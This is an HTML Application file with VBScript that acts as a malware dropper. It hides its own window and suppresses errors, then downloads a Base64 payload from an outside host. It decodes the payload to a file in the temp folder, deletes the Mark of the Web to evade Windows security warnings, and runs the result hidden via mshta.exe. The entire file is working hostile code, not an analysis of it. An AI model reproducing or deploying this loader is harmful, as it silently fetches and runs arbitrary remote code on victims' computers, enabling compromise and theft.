<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, xh, st, path, b64, xml, node
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' 1. Download the Base64 text
xh.Open "GET", "https://dicerigx.app/payload.txt", False
xh.Send

If xh.Status = 200 Then
    b64 = xh.responseText
    path = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys.hta"
    
    ' 2. Decode the Base64 into the real HTA
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.CreateElement("b64")
    node.dataType = "bin.base64"
    node.text = b64
    
    Set st = CreateObject("ADODB.Stream")
    st.Type = 1
    st.Open
    st.Write node.nodeTypedValue
    st.SaveToFile path, 2
    st.Close
    
    ' 3. Strip the Mark of the Web
    On Error Resume Next
    fso.DeleteFile path & ":Zone.Identifier", True
    On Error GoTo 0
    
    ' 4. Run the local file hidden
    sh.Run "mshta.exe """ & path & """", 0, False
End If

window.close()
</script>
</head><body></body></html>
